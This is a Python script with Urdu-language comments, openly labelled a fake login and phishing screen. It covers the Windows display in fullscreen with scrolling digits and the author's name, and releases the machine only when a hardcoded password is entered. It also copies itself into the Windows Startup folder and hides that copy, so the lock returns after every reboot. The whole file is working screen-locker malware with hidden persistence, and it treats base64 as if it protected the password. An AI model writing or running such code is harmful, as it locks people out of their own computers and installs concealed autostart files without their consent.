import tkinter as tk
import random
import os
import base64
import sys
import shutil
import subprocess
import psutil  # Chalte hue processes check karne ke liye

# Password ko base64 mein encode karna (asjid2004)
encoded_password = base64.b64encode(b"asjid2004").decode()

# Yeh check karne ke liye ke application pehle se chal rahi hai
def is_running():
    current_process_name = os.path.basename(sys.argv[0])
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == current_process_name:
            return True
    return False

# Password darj karne par application band karne ki function
def check_login():
    entered_password = password_entry.get()
    decoded_password = base64.b64decode(encoded_password).decode()  # Password ko decode karein
    if entered_password == decoded_password:
        root.quit()  # Program band karein
    else:
        message_label.config(text="Invalid password!", fg="red")

# Screen par random numbers generate karne ki function
def generate_random_numbers():
    canvas.delete("all")  # Pehle se maujood numbers ko saaf karein
    for _ in range(1000):  # 100 random numbers dikhain
        x = random.randint(0, window_width)
        y = random.randint(0, window_height)
        number = random.randint(0, 9)
        canvas.create_text(x, y, text=str(number), fill="green", font=("Courier", 14))
    
    # "It's me Mr. Asjid" upar dikhain
    canvas.create_text(window_width // 2, window_height // 7, text="It's me Mr. Asjid", fill="white", font=("Arial", 50, "bold"))
    
    # "Kazmi" ko "It's me Mr. Asjid" ke neeche dikhain
    canvas.create_text(window_width // 2, window_height // 4, text="Kazmi", fill="white", font=("Arial", 40, "bold"))

    root.after(100, generate_random_numbers)  # Har 100 milliseconds mein dobarah dikhain

# Application ko Windows startup mein shamil karne ki function
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    
    # Startup folder ka path hasil karna
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

    # Current script ka naam hasil karna
    file_name = os.path.basename(sys.argv[0])

    # Executable ko startup folder mein copy karna
    try:
        shutil.copy(os.path.join(file_path, file_name), os.path.join(startup_folder, file_name))
        print(f"File successfully copied to {startup_folder}")
    except Exception as e:
        print(f"Failed to copy file to startup: {str(e)}")
    
    # File ko chhupana
    hide_file(os.path.join(startup_folder, file_name))

# Startup folder mein file ko chhupana
def hide_file(file_path):
    subprocess.call(['attrib', '+H', file_path])

# Check karna agar application pehle se chal rahi ho
if not is_running():
    # Main phishing window banana
    root = tk.Tk()
    root.title("Fake Login Screen")

    # Window ko fullscreen banana
    root.attributes('-fullscreen', True)  # Fullscreen mode
    window_width = root.winfo_screenwidth()
    window_height = root.winfo_screenheight()

    # Random numbers dikhane ke liye canvas banana
    canvas = tk.Canvas(root, width=window_width, height=window_height, bg="black")
    canvas.pack(fill="both", expand=True)

    # Password box frame banana
    password_frame = tk.Frame(root, bg="white", padx=10, pady=10)
    password_frame.place(relx=0.5, rely=0.6, anchor='center')  # Text ke neeche position

    # Password label aur entry box
    password_label = tk.Label(password_frame, text="Enter Password:", bg="white")
    password_label.pack(anchor="w")

    password_entry = tk.Entry(password_frame, show="*")
    password_entry.pack(fill='x', pady=5)

    # Login button
    login_button = tk.Button(password_frame, text="Submit", command=check_login)
    login_button.pack(pady=10)

    # Login status dikhane ke liye label
    message_label = tk.Label(password_frame, text="", bg="white")
    message_label.pack(pady=10)

    # Background mein random numbers generate karna shuru karein
    generate_random_numbers()

    # File ko startup mein automatically shamil karein aur chhupain
    add_to_startup()

    # Application chalana
    root.mainloop()
else:
    print("The application is already running.")
